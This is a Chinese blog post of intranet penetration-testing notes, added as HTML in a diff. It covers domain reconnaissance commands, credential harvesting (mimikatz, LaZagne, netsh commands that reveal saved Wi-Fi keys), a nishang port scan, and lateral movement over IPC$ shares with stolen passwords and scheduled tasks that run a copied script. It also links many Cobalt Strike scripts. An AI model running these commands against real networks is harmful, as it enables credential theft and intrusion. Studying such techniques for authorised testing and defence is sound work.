@@ -1,0 +1,1126 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/1.jpg">
+  <link rel="icon" href="/img/1.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Franky">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="image.png http:&#x2F;&#x2F;unixwiz.net&#x2F;tools&#x2F;nbtscan.html https:&#x2F;&#x2F;github.com&#x2F;samratashok&#x2F;nishang https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz https:&#x2F;&#x2F;github.com&#x2F;huntergregal&#x2F;mimipenguin https:&#x2F;&#x2F;github.com&#x2F;Alessandro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透笔记">
+<meta property="og:url" content="http://example.com/2023/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Franky&amp;blog">
+<meta property="og:description" content="image.png http:&#x2F;&#x2F;unixwiz.net&#x2F;tools&#x2F;nbtscan.html https:&#x2F;&#x2F;github.com&#x2F;samratashok&#x2F;nishang https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz https:&#x2F;&#x2F;github.com&#x2F;huntergregal&#x2F;mimipenguin https:&#x2F;&#x2F;github.com&#x2F;Alessandro">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="d:\blog2\source_posts\%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0.assets\1631524721519-05afcd0b-b562-411b-bd85-32df42deadb3.png">
+<meta property="og:image" content="d:\blog2\source_posts\%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0.assets\1631612310522-a9de1557-6b29-415c-9bec-3d4fecf33e11.png">
+<meta property="og:image" content="d:\blog2\source_posts\%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0.assets\1633082373154-ffa7b109-6ace-41f5-a049-838bb9ff396a.png">
+<meta property="og:image" content="d:\blog2\source_posts\%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0.assets\1633082376650-a7662dfd-7a4c-44a6-9365-2d94a0fd8aca.png">
+<meta property="og:image" content="d:\blog2\source_posts\%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0.assets\1634029248272-10cfa245-2cde-465d-82c1-f46cca9e61c7.png">
+<meta property="article:published_time" content="2023-12-08T07:15:44.000Z">
+<meta property="article:modified_time" content="2024-02-24T21:15:24.446Z">
+<meta property="article:author" content="Franky">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="d:\blog2\source_posts\%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0.assets\1631524721519-05afcd0b-b562-411b-bd85-32df42deadb3.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>内网渗透笔记 - Franky&amp;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Franky</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内网渗透笔记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-08 15:15" pubdate>
+          2023年12月8日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          50 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内网渗透笔记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/1631524721519-05afcd0b-b562-411b-bd85-32df42deadb3.png"><img src="D:\blog2\source_posts\内网渗透笔记.assets\1631524721519-05afcd0b-b562-411b-bd85-32df42deadb3.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+<p>image.png</p>
+<p><a target="_blank" rel="noopener" href="http://unixwiz.net/tools/nbtscan.html">http://unixwiz.net/tools/nbtscan.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
+<p><a target="_blank" rel="noopener" href="https://xenarmor.com/allinone-password-recovery-pro-software">https://xenarmor.com/allinone-password-recovery-pro-software</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164507.html">https://www.freebuf.com/sectool/164507.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/RichChigga/impacket-examples-windows">https://gitee.com/RichChigga/impacket-examples-windows</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10661480.html">https://www.cnblogs.com/-qing-/p/10661480.html</a> Windows渗透测试中wmi的利用</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Vh4ELTFvyBhv3Avzft1fCw">https://pan.baidu.com/s/1Vh4ELTFvyBhv3Avzft1fCw</a> 提取码：xiao</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pandasec888/taowu-cobalt-strike">https://github.com/pandasec888/taowu-cobalt-strike</a></p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/15DCt2Rzg5cZjXnEuUTgQ9Q">https://pan.baidu.com/s/15DCt2Rzg5cZjXnEuUTgQ9Q</a> 提取码：dtm2</p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug">https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug</a> 提取码：taqu</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/DeEpinGh0st/Erebus">https://github.com/DeEpinGh0st/Erebus</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bluscreenofjeff/AggressorScripts">https://github.com/bluscreenofjeff/AggressorScripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/michalkoczwara/aggressor_scripts_collection">https://github.com/michalkoczwara/aggressor_scripts_collection</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vysecurity/Aggressor-VYSEC">https://github.com/vysecurity/Aggressor-VYSEC</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ramen0x3f/AggressorScripts">https://github.com/ramen0x3f/AggressorScripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/threatexpress/persistence-aggressor-script">https://github.com/threatexpress/persistence-aggressor-script</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/threatexpress/aggressor-scripts">https://github.com/threatexpress/aggressor-scripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/branthale/CobaltStrikeCNA">https://github.com/branthale/CobaltStrikeCNA</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor">https://github.com/gaudard/scripts/tree/master/red-team/aggressor</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/001SPARTaN/aggressor_scripts">https://github.com/001SPARTaN/aggressor_scripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Und3rf10w/Aggressor-scripts">https://github.com/Und3rf10w/Aggressor-scripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Aggressor-Script">https://github.com/rasta-mouse/Aggressor-Script</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vysec/Aggressor-VYSEC">https://github.com/vysec/Aggressor-VYSEC</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/threatexpress/aggressor-scripts">https://github.com/threatexpress/aggressor-scripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/threatexpress/red-team-scripts">https://github.com/threatexpress/red-team-scripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vysec/CVE-2018-4878">https://github.com/vysec/CVE-2018-4878</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bluscreenofjeff/AggressorScripts">https://github.com/bluscreenofjeff/AggressorScripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/360-A-Team/CobaltStrike-Toolset">https://github.com/360-A-Team/CobaltStrike-Toolset</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ars3n11/Aggressor-Scripts">https://github.com/ars3n11/Aggressor-Scripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/michalkoczwara/aggressor_scripts_collection">https://github.com/michalkoczwara/aggressor_scripts_collection</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ZonkSec/persistence-aggressor-script">https://github.com/ZonkSec/persistence-aggressor-script</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Aggressor-Script">https://github.com/rasta-mouse/Aggressor-Script</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/RhinoSecurityLabs/Aggressor-Scripts">https://github.com/RhinoSecurityLabs/Aggressor-Scripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Genetic-Malware/Ebowla">https://github.com/Genetic-Malware/Ebowla</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/001SPARTaN/aggressor_scripts">https://github.com/001SPARTaN/aggressor_scripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor">https://github.com/gaudard/scripts/tree/master/red-team/aggressor</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/branthale/CobaltStrikeCNA">https://github.com/branthale/CobaltStrikeCNA</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/oldb00t/AggressorScripts">https://github.com/oldb00t/AggressorScripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/p292/Phant0m_cobaltstrike">https://github.com/p292/Phant0m_cobaltstrike</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/p292/DDEAutoCS">https://github.com/p292/DDEAutoCS</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/secgroundzero/CS-Aggressor-Scripts">https://github.com/secgroundzero/CS-Aggressor-Scripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/skyleronken/Aggressor-Scripts">https://github.com/skyleronken/Aggressor-Scripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/tevora-threat/aggressor-powerview">https://github.com/tevora-threat/aggressor-powerview</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/tevora-threat/PowerView3-Aggressor">https://github.com/tevora-threat/PowerView3-Aggressor</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/threatexpress/persistence-aggressor-script">https://github.com/threatexpress/persistence-aggressor-script</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/C0axx/AggressorScripts">https://github.com/C0axx/AggressorScripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/offsecginger/AggressorScripts">https://github.com/offsecginger/AggressorScripts</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/tomsteele/cs-magik">https://github.com/tomsteele/cs-magik</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/nopowershell">https://github.com/bitsadmin/nopowershell</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/SharpCompile">https://github.com/SpiderLabs/SharpCompile</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/realoriginal/reflectivepotato">https://github.com/realoriginal/reflectivepotato</a></p>
+<h3 id="1-基本信息收集"><a href="#1-基本信息收集" class="headerlink" title="1.基本信息收集"></a>1.基本信息收集</h3><p>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备</p>
+<p>systeminfo 详细信息</p>
+<p>net start 启动服务</p>
+<p>tasklist 进程列表</p>
+<p>schtasks 计划任务</p>
+<h3 id="2-网络信息收集"><a href="#2-网络信息收集" class="headerlink" title="2.网络信息收集"></a>2.网络信息收集</h3><p>旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备</p>
+<p>ipconfig &#x2F;all 判断存在域-dns</p>
+<p>net view &#x2F;domain 判断存在域</p>
+<p>net time &#x2F;domain 判断主域</p>
+<p>netstat -ano 当前网络端口开放</p>
+<p>nslookup 域名 追踪来源地址</p>
+<h3 id="3-用户信息收集"><a href="#3-用户信息收集" class="headerlink" title="3.用户信息收集"></a>3.用户信息收集</h3><p>旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试</p>
+<p>系统默认常见用户身份：</p>
+<p>Domain Admins：域管理员（默认对域控制器有完全控制权）</p>
+<p>Domain Computers：域内机器</p>
+<p>Domain Controllers：域控制器</p>
+<p>Domain Guest：域访客，权限低</p>
+<p>Domain Users：域用户</p>
+<p>Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）</p>
+<p>相关用户收集操作命令：</p>
+<p>whoami &#x2F;all 用户权限</p>
+<p>net config workstation 登录信息</p>
+<p>net user 本地用户</p>
+<p>net localgroup 本地用户组</p>
+<p>net user &#x2F;domain 获取域用户信息</p>
+<p>net group &#x2F;domain 获取域用户组信息</p>
+<p>wmic useraccount get &#x2F;all 涉及域用户详细信息</p>
+<p>net group “Domain Admins” &#x2F;domain 查询域管理员账户</p>
+<p>net group “Enterprise Admins” &#x2F;domain 查询管理员用户组</p>
+<p>net group “Domain Controllers” &#x2F;domain 查询域控制器</p>
+<h3 id="4-凭据信息收集"><a href="#4-凭据信息收集" class="headerlink" title="4.凭据信息收集"></a>4.凭据信息收集</h3><p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备</p>
+<p>计算机用户 HASH，明文获取 <a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/mimikatz">mimikatz</a>(win)，<a target="_blank" rel="noopener" href="https://github.com/huntergregal/mimipenguin">mimipenguin</a>(linux)</p>
+<p>计算机各种协议服务口令获取 <a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a>(all)，<a target="_blank" rel="noopener" href="https://xenarmor.com/allinone-password-recovery-pro-software">XenArmor</a>)(win)</p>
+<p>Netsh WLAN show profiles</p>
+<p>Netsh WLAN show profile name&#x3D;”无线名称” key&#x3D;clear</p>
+<p>1.站点源码备份文件、数据库备份文件等</p>
+<p>2.各类数据库 Web 管理入口，如 PHPMyAdmin</p>
+<p>3.浏览器保存密码、浏览器 Cookies</p>
+<p>4.其他用户会话、3389 和 ipc$连接记录、回收站内容</p>
+<p>5.Windows 保存的 WIFI 密码</p>
+<p>6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等</p>
+<h3 id="5-探针主机域控架构服务"><a href="#5-探针主机域控架构服务" class="headerlink" title="5.探针主机域控架构服务"></a>5.探针主机域控架构服务</h3><p>为后续横向思路做准备，针对应用，协议等各类攻击手法</p>
+<p>探针域控制器名及地址信息</p>
+<p>net time &#x2F;domain nslookup ping</p>
+<p>探针域内存活主机及地址信息</p>
+<p><a target="_blank" rel="noopener" href="http://www.unixwiz.net/tools/nbtscan.html#download">nbtscan</a> 192.168.3.0&#x2F;24 第三方工具</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 自带内部命令</span><br><span class="hljs-attribute">for</span> /L %I in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) DO @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span> <br><br><span class="hljs-attribute">POWERSHELL</span><br></code></pre></td></tr></table></figure>
+
+<p>nmap masscan 第三方 PowerShell 脚本 nishang empire 等</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#导入模块 nishang</span><br><span class="hljs-built_in">Import-Module</span> .\nishang.psm1<br><span class="hljs-comment">#设置执行策略</span><br><span class="hljs-built_in">Set-ExecutionPolicy</span> RemoteSigned<br><span class="hljs-comment">#获取模块 nishang 的命令函数</span><br><span class="hljs-built_in">Get-Command</span> <span class="hljs-literal">-Module</span> nishang<br><span class="hljs-comment">#获取常规计算机信息</span><br><span class="hljs-built_in">Get-Information</span><br><span class="hljs-comment">#端口扫描（查看目录对应文件有演示语法，其他同理）</span><br><span class="hljs-built_in">Invoke-PortScan</span> <span class="hljs-literal">-StartAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">229.0</span> <span class="hljs-literal">-EndAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">229.255</span> <span class="hljs-literal">-ResolveHost</span> <span class="hljs-literal">-ScanPort</span><br><span class="hljs-comment">#其他功能：删除补丁，反弹 Shell，凭据获取等</span><br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<p>探针域内主机角色及服务信息</p>
+<p>利用开放端口服务及计算机名判断</p>
+<p>核心业务机器:</p>
+<p>1.高级管理人员、系统管理员、财务&#x2F;人事&#x2F;业务人员的个人计算机</p>
+<p>2.产品管理系统服务器</p>
+<p>3.办公系统服务器</p>
+<p>4.财务应用系统服务器</p>
+<p>5.核心产品源码服务器（自建 SVN、GIT）</p>
+<p>6.数据库服务器</p>
+<p>7.文件或网盘服务器、共享服务器</p>
+<p>8.电子邮件服务器</p>
+<p>9.网络监控系统服务器</p>
+<p>10.其他服务器（内部技术文档服务器、其他监控服务器等）</p>
+<h3 id="6-横向渗透明文传递-at-schtasks"><a href="#6-横向渗透明文传递-at-schtasks" class="headerlink" title="6.横向渗透明文传递 at&amp;schtasks"></a>6.横向渗透明文传递 at&amp;schtasks</h3><p>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？</p>
+<p>这里仅介绍 at&amp;schtasks 命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。</p>
+<p>获取到某域主机权限-&gt;minikatz 得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典-》尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或者相关命令</p>
+<p>利用流程</p>
+<p>\1. 建立 IPC 链接到目标主机</p>
+<p>\2. 拷贝要执行的命令脚本到目标主机</p>
+<p>\3. 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</p>
+<p>\4. 删除 IPC 链接</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 工作组</span><br>net use \\server\ipc<span class="hljs-variable">$</span><span class="hljs-string">&quot;password&quot;</span> /user:username<br><br><span class="hljs-comment">#域内</span><br>net use \\server\ipc<span class="hljs-variable">$</span><span class="hljs-string">&quot;password&quot;</span> /user:domain\username<br><br><span class="hljs-comment"># 查看文件列表</span><br><span class="hljs-built_in">dir</span> \\xx.xx.xx.xx\C<span class="hljs-variable">$</span>\<br><br><span class="hljs-comment"># 下载文件</span><br><span class="hljs-built_in">copy</span> \\xx.xx.xx.xx\C<span class="hljs-variable">$</span>\<span class="hljs-number">1</span>.bat <span class="hljs-number">1</span>.bat<br><br><span class="hljs-comment"># 复制文件</span><br><span class="hljs-built_in">copy</span> <span class="hljs-number">1</span>.bat \\xx.xx.xx.xx\C<span class="hljs-variable">$</span><br><br><span class="hljs-comment"># 删除 IPC</span><br>net use \\xx.xx.xx.xx\C<span class="hljs-variable">$</span>\<span class="hljs-number">1</span>.bat /<span class="hljs-built_in">del</span><br><br><span class="hljs-comment"># 查看对方共享</span><br>net view xx.xx.xx.xx<br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<p>建立 IPC 常见的错误代码</p>
+<p>（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</p>
+<p>（2）51：网络问题，Windows 无法找到网络路径</p>
+<p>（3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有 防火墙等问题</p>
+<p>（4）67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$</p>
+<p>（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除</p>
